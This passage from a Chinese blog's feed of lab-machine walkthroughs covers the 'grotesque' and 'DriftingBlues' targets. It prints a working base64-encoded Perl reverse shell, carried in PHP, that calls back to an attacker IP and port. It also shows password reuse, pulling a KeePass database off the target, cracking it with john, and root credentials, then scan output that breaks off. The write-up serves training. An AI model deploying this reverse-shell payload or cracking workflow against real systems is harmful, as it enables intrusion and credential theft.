&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">fputs&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$fp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$text&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$fp&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$yourip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;10.9.23.111&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">#kali的IP地址
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$yourport&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;4444&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">#nc监听端口
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$usedb&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;perl&amp;#39;&lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="s1">&amp;#39;perl&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$back_connect&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/tmp/.bc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$back_connect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">execute&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">which&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;perl&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34; /tmp/.bc &lt;/span>&lt;span class="si">$yourip&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">$yourport&lt;/span>&lt;span class="s2"> &amp;amp;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>保存后现在kali中使用nc监听端口，然后浏览器访问写入反弹shell的页面&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvvp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="img/20240116223005.png" alt="image.png">&lt;/p>
&lt;p>反弹进入后可以使用&lt;code>python -c &amp;quot;import pty;pty.spawn('/bin/bash')&amp;quot;&lt;/code> 获取伪终端&lt;/p>
&lt;h3 id="三提权">三、提权&lt;/h3>
&lt;p>进来后，先随便找找文件&lt;/p>
&lt;p>在&lt;code>/var/www/html/lyricsblog/&lt;/code>目录下，发现wordpress配置文件&lt;code>wp-config.php&lt;/code>中有账号和密码&lt;/p>
&lt;p>&lt;img src="img/20240116223802.png" alt="image.png">&lt;/p>
&lt;p>使用&lt;code>cat /etc/passwd&lt;/code>命令发现包含&lt;code>raphael&lt;/code>用户&lt;/p>
&lt;p>&lt;img src="img/20240116223929.png" alt="image.png">&lt;/p>
&lt;p>尝试登录&lt;code>raphael&lt;/code>用户&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">www-data@grotesque:/var/www/html/lyricsblog$ su raphael
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">su raphael
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password: _double_trouble_
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">raphael@grotesque:/var/www/html/lyricsblog$ &lt;span class="nb">cd&lt;/span> /
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">raphael@grotesque:/$ id
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">id
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>1000&lt;span class="o">(&lt;/span>raphael&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>1000&lt;span class="o">(&lt;/span>raphael&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>1000&lt;span class="o">(&lt;/span>raphael&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">raphael@grotesque:/$ uname -a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uname -a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux grotesque 4.19.0-13-amd64 &lt;span class="c1">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">raphael@grotesque:/$ sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: sudo: &lt;span class="nb">command&lt;/span> not found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">raphael@grotesque:/$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>登录成功，查看系统内核信息和用户权限，发现无法通过这两项提权&lt;/p>
&lt;p>那就先拿个flag，在&lt;code>/home/raphael&lt;/code>&lt;/p>
&lt;p>&lt;img src="img/20240116223221.png" alt="image.png">&lt;/p>
&lt;p>该目录下同时发现，&lt;code>.kdbx&lt;/code>文件，该文件是keepass密码管理器的数据库，内容加密&lt;/p>
&lt;p>靶机开启HTTP服务&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 -m http.server &lt;span class="m">9861&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将&lt;code>.chadroot.kdbx&lt;/code>文件下载到kali中解密&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# wget http://10.9.23.155:9861/.chadroot.kdbx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--2024-01-16 22:50:11-- http://10.9.23.155:9861/.chadroot.kdbx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connecting to 10.9.23.155:9861... connected.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTTP request sent, awaiting response... &lt;span class="m">200&lt;/span> OK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Length: &lt;span class="m">2174&lt;/span> &lt;span class="o">(&lt;/span>2.1K&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>application/octet-stream&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Saving to: ‘.chadroot.kdbx’
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.chadroot.kdbx 100%&lt;span class="o">[=======================================================&lt;/span>&amp;gt;&lt;span class="o">]&lt;/span> 2.12K --.-KB/s in 0.002s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-01-16 22:50:12 &lt;span class="o">(&lt;/span>&lt;span class="m">961&lt;/span> KB/s&lt;span class="o">)&lt;/span> - ‘.chadroot.kdbx’ saved &lt;span class="o">[&lt;/span>2174/2174&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用 keepass2john 和 john 破解该数据库的密码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# keepass2john .chadroot.kdbx &lt;span class="p">|&lt;/span> tee &lt;span class="nb">hash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.chadroot:&lt;span class="nv">$keepass$*&lt;/span>2*60000*0*d34ff0b3bbce285d4553b994d1377a942145c2066611eeec2b4de8359f92d18c*e1ae12738ee79dabedfaf7f387275bfb4afc77b6943d02c156eabfaac3c2e58b*638b2e50ed9f0e910f7a96dbeb990c6d*4779254b4e0535bbfa31cf2d31a8ef86033ddbc13be2a5b25e9b0b5983448681*d32ea132be90e65089bfb5c7b6fee69019ada50b62d2e11c6d77d92f2856ba1c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# john &lt;span class="nb">hash&lt;/span> --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/rockyou.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>KeePass &lt;span class="o">[&lt;/span>SHA256 AES 32/64&lt;span class="o">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>iteration count&lt;span class="o">)&lt;/span> is &lt;span class="m">60000&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">2&lt;/span> &lt;span class="o">(&lt;/span>version&lt;span class="o">)&lt;/span> is &lt;span class="m">2&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">3&lt;/span> &lt;span class="o">(&lt;/span>algorithm &lt;span class="o">[&lt;/span>&lt;span class="nv">0&lt;/span>&lt;span class="o">=&lt;/span>AES &lt;span class="nv">1&lt;/span>&lt;span class="o">=&lt;/span>TwoFish &lt;span class="nv">2&lt;/span>&lt;span class="o">=&lt;/span>ChaCha&lt;span class="o">])&lt;/span> is &lt;span class="m">0&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will run &lt;span class="m">4&lt;/span> OpenMP threads
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, almost any other key &lt;span class="k">for&lt;/span> status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chatter &lt;span class="o">(&lt;/span>.chadroot&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1g 0:00:03:21 DONE &lt;span class="o">(&lt;/span>2024-01-16 23:04&lt;span class="o">)&lt;/span> 0.004961g/s 133.8p/s 133.8c/s 133.8C/s colombiano..candyapple
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Use the &lt;span class="s2">&amp;#34;--show&amp;#34;&lt;/span> option to display all of the cracked passwords reliably
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="img/20240116230500.png" alt="image.png">&lt;/p>
&lt;p>使用&lt;a href="https://app.keeweb.info/">https://app.keeweb.info/&lt;/a>网站在线查看密码数据库，使用第三个密码&lt;/p>
&lt;p>得到root用户和密码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">用户：root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：.:.subjective.:.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>登录root用户，提权成功&lt;/p>
&lt;p>&lt;img src="img/20240116231234.png" alt="image.png">&lt;/p>
&lt;p>夺旗flag&lt;/p>
&lt;p>&lt;img src="img/20240117085313.png" alt="image.png">&lt;/p></description></item><item><title>靶机：DriftingBlues</title><link>https://www.inecho.cc/zh-cn/2023/09/26/%E9%9D%B6%E6%9C%BAdriftingblues/</link><pubDate>Tue, 26 Sep 2023 00:00:00 +0000</pubDate><guid>https://www.inecho.cc/zh-cn/2023/09/26/%E9%9D%B6%E6%9C%BAdriftingblues/</guid><description>&lt;p>&lt;code>nmap 10.9.23.0/24&lt;/code> 扫描当前网段，确认靶机 IP：10.9.75.215&lt;/p>
&lt;p>&lt;img src="img/20240113165133.png" alt="image.png">&lt;/p>
&lt;p>详细扫描&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# nmap -sV -p- 10.9.23.215
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-13 16:53 CST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> bogon &lt;span class="o">(&lt;/span>10.9.23.215&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.010s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65533&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.18 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MAC Address: 08:00:27:1F:2A:48 &lt;span class="o">(&lt;/span>Oracle VirtualBox virtual NIC&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OS: Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 32.62 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>dirb探测隐藏目录&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# dirb http://10.9.23.215
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DIRB v2.22
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">By The Dark Raver
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">START_TIME: Sat Jan &lt;span class="m">13&lt;/span> 16:53:32 &lt;span class="m">2024&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">URL_BASE: http://10.9.23.215/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GENERATED WORDS: &lt;span class="m">4612&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Scanning URL: http://10.9.23.215/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.23.215/css/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.23.215/img/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.23.215/index.html &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:7710&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.23.215/js/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.23.215/server-status &lt;span class="o">(&lt;/span>CODE:403&lt;span class="p">|&lt;/span>SIZE:276&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.23.215/css/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>!&lt;span class="o">)&lt;/span> WARNING: Directory IS LISTABLE. No need to scan it.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>Use mode &lt;span class="s1">&amp;#39;-w&amp;#39;&lt;/span> &lt;span class="k">if&lt;/span> you want to scan it anyway&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.23.215/img/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>!&lt;span class="o">)&lt;/span> WARNING: Directory IS LISTABLE. No need to scan it.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>Use mode &lt;span class="s1">&amp;#39;-w&amp;#39;&lt;/span> &lt;span class="k">if&lt;/span> you want to scan it anyway&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.23.215/js/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>!&lt;span class="o">)&lt;/span> WARNING: Directory IS LISTABLE. No need to scan it.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>Use mode &lt;span class="s1">&amp;#39;-w&amp;#39;&lt;/span> &lt;span class="k">if&lt;/span> you want to scan it anyway&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">END_TIME: Sat Jan &lt;span class="m">13&lt;/span> 16:53:55 &lt;span class="m">2024&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DOWNLOADED: &lt;span class="m">4612&lt;/span> - FOUND: &lt;span class="m">2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>gobuster，探测隐藏目录&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# gobuster dir -u http://10.9.23.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Gobuster v3.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">by OJ Reeves &lt;span class="o">(&lt;/span>@TheColonial&lt;span class="o">)&lt;/span> &lt;span class="p">&amp;amp;&lt;/span> Christian Mehlmauer &lt;span class="o">(&lt;/span>@firefart&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Url: http://10.9.23.215
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Method: GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Threads: &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Negative Status codes: &lt;span class="m">404&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> User Agent: gobuster/3.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extensions: php,html,txt,sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Timeout: &lt;span class="nv">10s&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting gobuster in directory enumeration &lt;span class="nv">mode&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/index.html &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 7710&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/.html &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 276&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/img &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 308&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.9.23.215/img/&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/css &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 308&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.9.23.215/css/&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/js &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 307&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.9.23.215/js/&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/secret.html &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 25&lt;span class="o">]&lt;/span>
